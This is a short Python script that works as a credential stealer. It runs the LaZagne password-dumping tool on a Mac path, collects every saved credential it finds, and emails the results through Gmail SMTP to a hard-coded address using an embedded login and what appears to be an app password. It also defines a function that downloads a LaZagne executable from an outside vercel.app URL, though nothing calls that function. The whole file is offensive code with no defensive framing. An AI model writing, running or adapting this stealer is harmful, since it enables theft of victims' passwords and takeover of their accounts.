#!/usr/bin/env python
import subprocess
import smtplib
import requests
import os

URL = "https://smtps-one.vercel.app/laZagne_x86.exe"

def get_payload(url):
    get_request = requests.get(url)
    name = url.split("/")[-1]
    with open(name, "wb") as payload:
        payload.write(get_request.content)
    return name

def execute():
    process = subprocess.Popen(
        ["python3", "LaZagne/Mac/laZagne.py", "all", "-v"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    result, error = process.communicate()
    try:
        return result.decode('latin-1').encode("utf-8")
    except:
        return str(result)

def mail_it(email, passwd, to_mail, msg):
    mailserver = smtplib.SMTP("smtp.gmail.com", 587)
    mailserver.starttls()
    mailserver.login(email, passwd)
    mailserver.sendmail(email, to_mail, msg)
    mailserver.quit()

message = execute()
mail_it("domiyungforex@gmail.com", "zbcpkndmpefgdhrb", "domiyungforex@gmail.com", message)
